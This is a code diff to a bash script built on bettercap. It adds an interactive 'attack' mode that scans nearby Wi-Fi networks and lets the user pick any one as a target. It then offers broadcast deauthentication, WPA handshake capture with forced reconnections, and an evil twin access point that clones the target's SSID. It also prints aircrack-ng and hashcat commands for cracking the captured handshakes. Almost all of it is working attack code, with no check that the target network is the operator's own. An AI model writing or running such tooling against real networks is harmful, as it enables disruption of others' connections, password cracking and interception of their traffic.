@@ -21,6 +21,9 @@ BETTERCAP_LOG="$RUNTIME/bettercap.log"
 BETTERCAP_PCAP_DIR="$RUNTIME/sniff"
 BETTERCAP_PID="$RUNTIME/bettercap.pid"
 HANDSHAKE_DIR="$RUNTIME/handshakes"
+ATTACK_IF="${ATTACK_IF:-$AP_IF}"  # Interface for attacking (default: same as AP)
+SCAN_RESULTS="$RUNTIME/scan_results.txt"
+EVIL_TWIN_DIR="$RUNTIME/evil_twin"
 
 # Set during start by prompt_security()
 SECURITY_MODE="${SECURITY_MODE:-open}"   # "open" or "wpa2"
@@ -34,6 +37,7 @@ Usage:
   sudo $SCRIPT_NAME start
   sudo $SCRIPT_NAME stop
   sudo $SCRIPT_NAME deauth [MAC] [count] [capture]
+  sudo $SCRIPT_NAME attack
   sudo $SCRIPT_NAME help
   sudo $SCRIPT_NAME -h | --help
 
@@ -43,6 +47,8 @@ Description:
   On 'start' you'll be asked whether to secure the AP with WPA2-PSK.
   The 'deauth' command can disconnect clients from the AP and optionally capture
   authentication handshakes for later password cracking attempts.
+  The 'attack' command provides an interactive menu for scanning networks and
+  selecting various attack methods including evil twin, deauth, and handshake capture.
 
 Current defaults:
   INTERNET_IF=$INTERNET_IF
@@ -320,6 +326,296 @@ deauth_clients() {
   fi
 }
 
+scan_networks() {
+  echo "Scanning for wireless networks..."
+  mkdir -p "$RUNTIME"
+  
+  # Kill any existing bettercap instances
+  pkill -f "^bettercap" 2>/dev/null || true
+  
+  # Start bettercap in scan mode
+  echo "Starting scan on $ATTACK_IF (this will take about 20 seconds)"
+  
+  # Clear previous scan results
+  rm -f "$SCAN_RESULTS"
+  
+  # Use bettercap to scan networks
+  bettercap -iface "$ATTACK_IF" -no-colors -eval "
+    set wifi.interface $ATTACK_IF
+    wifi.recon on
+    sleep 20
+    wifi.show
+    wifi.recon off
+    quit
+  " | tee "$SCAN_RESULTS"
+  
+  # Filter and display results in a cleaner format
+  echo ""
+  echo "Available Networks:"
+  echo "-----------------"
+  
+  # Extract BSSID, SSID, RSSI and Encryption
+  grep -E "^[a-fA-F0-9]{2}:" "$SCAN_RESULTS" |
+    grep -v "<hidden>" |
+    awk '{printf "%3d) %s %s (%s) Ch:%s Enc:%s\n", NR, $1, $3, $5, $4, $6}' |
+    sed 's/"//g'
+  
+  # Return success
+  return 0
+}
+
+select_target_network() {
+  local network_count=$(grep -E "^[a-fA-F0-9]{2}:" "$SCAN_RESULTS" | grep -v "<hidden>" | wc -l)
+  
+  if [ "$network_count" -eq 0 ]; then
+    echo "No networks found. Please retry the scan."
+    return 1
+  fi
+  
+  # Ask user to select a network
+  local selection
+  while true; do
+    read -r -p "Select network number (1-$network_count) or 'r' to rescan: " selection
+    
+    if [[ "$selection" == "r" || "$selection" == "R" ]]; then
+      scan_networks
+      continue
+    fi
+    
+    if [[ "$selection" =~ ^[0-9]+$ && "$selection" -ge 1 && "$selection" -le "$network_count" ]]; then
+      break
+    fi
+    
+    echo "Invalid selection. Please try again."
+  done
+  
+  # Extract target information
+  local line=$(grep -E "^[a-fA-F0-9]{2}:" "$SCAN_RESULTS" | grep -v "<hidden>" | sed -n "${selection}p")
+  TARGET_BSSID=$(echo "$line" | awk '{print $1}')
+  TARGET_SSID=$(echo "$line" | awk '{print $3}' | sed 's/"//g')
+  TARGET_CHANNEL=$(echo "$line" | awk '{print $4}')
+  TARGET_ENCRYPTION=$(echo "$line" | awk '{print $6}')
+  
+  echo "Selected: $TARGET_SSID ($TARGET_BSSID) on channel $TARGET_CHANNEL"
+  return 0
+}
+
+attack_menu() {
+  echo ""
+  echo "Attack Options for $TARGET_SSID:"
+  echo "1. Deauthentication Attack"
+  echo "2. Capture WPA Handshake"
+  echo "3. Evil Twin Attack"
+  echo "4. Select Different Network"
+  echo "q. Quit"
+  
+  local choice
+  read -r -p "Select attack type [1-4/q]: " choice
+  
+  case "$choice" in
+    1)
+      # Deauth attack
+      echo "Performing deauthentication attack on $TARGET_SSID"
+      local deauth_count
+      read -r -p "Number of deauth packets to send [5]: " deauth_count
+      deauth_count="${deauth_count:-5}"
+      
+      # Set channel for attack
+      echo "Setting channel to $TARGET_CHANNEL..."
+      iwconfig "$ATTACK_IF" channel "$TARGET_CHANNEL" || true
+      
+      # Send deauth to broadcast address (all clients)
+      bettercap -iface "$ATTACK_IF" -no-colors -silent -eval "set wifi.interface $ATTACK_IF; wifi.deauth $TARGET_BSSID $deauth_count"
+      echo "Deauthentication attack completed."
+      ;;
+      
+    2)
+      # Handshake capture
+      echo "Capturing WPA handshake for $TARGET_SSID"
+      
+      # Set channel for attack
+      echo "Setting channel to $TARGET_CHANNEL..."
+      iwconfig "$ATTACK_IF" channel "$TARGET_CHANNEL" || true
+      
+      # Setup handshake capture
+      mkdir -p "$HANDSHAKE_DIR"
+      local ts="$(date +%Y%m%d-%H%M%S)"
+      local handshake_file="$HANDSHAKE_DIR/$TARGET_SSID-$ts.pcap"
+      
+      # Start capture in background
+      echo "Starting handshake capture (will save to $handshake_file)"
+      nohup bettercap -iface "$ATTACK_IF" -no-colors -silent \
+        -eval "set wifi.interface $ATTACK_IF; set net.sniff.output $handshake_file; set net.sniff.filter 'ether proto 0x888e or wlan type mgt subtype beacon or wlan type mgt subtype probe-resp or wlan type mgt subtype assoc-req or wlan type mgt subtype assoc-resp or wlan type mgt subtype reassoc-req or wlan type mgt subtype reassoc-resp or wlan type mgt subtype auth'; wifi.recon on; net.sniff on" \
+        > /dev/null 2>&1 &
+      
+      local monitor_pid=$!
+      
+      # Send some deauths to force reconnections
+      read -r -p "Number of deauth packets to send [5]: " deauth_count
+      deauth_count="${deauth_count:-5}"
+      
+      echo "Sending $deauth_count deauth packets to $TARGET_BSSID..."
+      bettercap -iface "$ATTACK_IF" -no-colors -silent -eval "set wifi.interface $ATTACK_IF; wifi.deauth $TARGET_BSSID $deauth_count"
+      
+      # Capture for a while
+      local capture_duration=30
+      echo "Capturing handshake for $capture_duration seconds..."
+      
+      # Show a countdown timer
+      for (( i=$capture_duration; i>0; i-- )); do
+        echo -ne "Time remaining: $i seconds\r"
+        sleep 1
+        
+        # Check if monitoring process is still running
+        if ! kill -0 $monitor_pid 2>/dev/null; then
+          echo "Monitoring process terminated unexpectedly."
+          break
+        fi
+      done
+      
+      # Kill the monitoring process
+      if kill -0 $monitor_pid 2>/dev/null; then
+        kill $monitor_pid 2>/dev/null
+        sleep 1
+        kill -9 $monitor_pid 2>/dev/null || true
+      fi
+      
+      echo -e "\nHandshake capture completed."
+      echo "Handshake saved to: $handshake_file"
+      echo ""
+      echo "You can use this file with password cracking tools like:"
+      echo "  aircrack-ng $handshake_file -w <wordlist>"
+      echo "  hashcat -m 22000 $handshake_file <wordlist>"
+      ;;
+      
+    3)
+      # Evil Twin Attack
+      echo "Setting up Evil Twin for $TARGET_SSID"
+      
+      # Create directory for evil twin
+      mkdir -p "$EVIL_TWIN_DIR"
+      
+      # Ask for evil twin configuration options
+      local twin_ssid
+      local twin_channel
+      local twin_security
+      local twin_passphrase
+      
+      # Option to customize SSID
+      read -r -p "Evil Twin SSID [$TARGET_SSID]: " twin_ssid
+      twin_ssid="${twin_ssid:-$TARGET_SSID}"
+      
+      # Option to customize channel
+      read -r -p "Evil Twin Channel [$TARGET_CHANNEL]: " twin_channel
+      twin_channel="${twin_channel:-$TARGET_CHANNEL}"
+      
+      # Option for security mode
+      while true; do
+        read -r -p "Security mode (open/wpa2) [open]: " twin_security
+        twin_security="${twin_security:-open}"
+        twin_security="${twin_security,,}"  # lowercase
+        
+        if [[ "$twin_security" == "open" || "$twin_security" == "wpa2" ]]; then
+          break
+        fi
+        echo "Invalid security mode. Please enter 'open' or 'wpa2'."
+      done
+      
+      # If WPA2, ask for passphrase
+      if [[ "$twin_security" == "wpa2" ]]; then
+        while true; do
+          read -r -s -p "Enter WPA2 passphrase (8–63 chars): " twin_passphrase; echo
+          if (( ${#twin_passphrase} < 8 || ${#twin_passphrase} > 63 )); then
+            echo "Invalid length (${#twin_passphrase}). Must be 8–63 characters."
+            continue
+          fi
+          break
+        done
+      fi
+      
+      # Start the evil twin
+      echo "Starting Evil Twin AP with SSID: $twin_ssid on channel $twin_channel"
+      
+      # Save original AP_IF value
+      local ORIG_AP_IF="$AP_IF"
+      local ORIG_SSID="$SSID"
+      local ORIG_CHANNEL="$CHANNEL"
+      local ORIG_SECURITY_MODE="$SECURITY_MODE"
+      local ORIG_PASSPHRASE="$PASSPHRASE"
+      
+      # Temporarily override global variables for AP setup
+      AP_IF="$ATTACK_IF"
+      SSID="$twin_ssid"
+      CHANNEL="$twin_channel"
+      SECURITY_MODE="$twin_security"
+      PASSPHRASE="$twin_passphrase"
+      
+      # Start AP
+      write_confs
+      start_ap
+      
+      # Restore original values
+      AP_IF="$ORIG_AP_IF"
+      SSID="$ORIG_SSID"
+      CHANNEL="$ORIG_CHANNEL"
+      SECURITY_MODE="$ORIG_SECURITY_MODE"
+      PASSPHRASE="$ORIG_PASSPHRASE"
+      
+      # Let user know how to stop the evil twin
+      echo ""
+      echo "Evil Twin AP is running. Press Enter to stop and return to the main menu."
+      read -r
+      
+      # Stop the evil twin AP
+      local ORIG_AP_IF="$AP_IF"
+      AP_IF="$ATTACK_IF"
+      stop_ap
+      AP_IF="$ORIG_AP_IF"
+      ;;
+      
+    4)
+      # Select different network
+      scan_networks
+      select_target_network
+      attack_menu
+      ;;
+      
+    q|Q)
+      echo "Exiting attack menu."
+      return 0
+      ;;
+      
+    *)
+      echo "Invalid selection."
+      attack_menu
+      ;;
+  esac
+  
+  # Return to attack menu after operation completes
+  echo ""
+  read -r -p "Press Enter to return to attack menu..."
+  attack_menu
+}
+
+start_attack_workflow() {
+  # Check for wireless interface in monitor mode
+  if ! iwconfig "$ATTACK_IF" 2>/dev/null | grep -q "Mode:Monitor"; then
+    echo "Setting $ATTACK_IF to monitor mode..."
+    ip link set "$ATTACK_IF" down
+    iwconfig "$ATTACK_IF" mode monitor
+    ip link set "$ATTACK_IF" up
+  fi
+  
+  # Scan for networks
+  scan_networks
+  
+  # Let user select a target
+  select_target_network
+  
+  # Show attack menu
+  attack_menu
+}
+
 start_ap() {
   rfkill unblock all || true
   if command -v nmcli >/dev/null 2>&1; then nmcli dev set "$AP_IF" managed no || true; fi
@@ -401,8 +697,13 @@ case "${1:-}" in
     check_bins
     deauth_clients "${2:-}" "${3:-5}" "${4:-false}"
     ;;
+  attack)
+    ensure_root
+    check_bins
+    start_attack_workflow
+    ;;
   *)
-    echo "Usage: sudo $SCRIPT_NAME {start|stop|deauth|help}"
+    echo "Usage: sudo $SCRIPT_NAME {start|stop|deauth|attack|help}"
     echo "Try:   sudo $SCRIPT_NAME --help"
     exit 1
     ;;
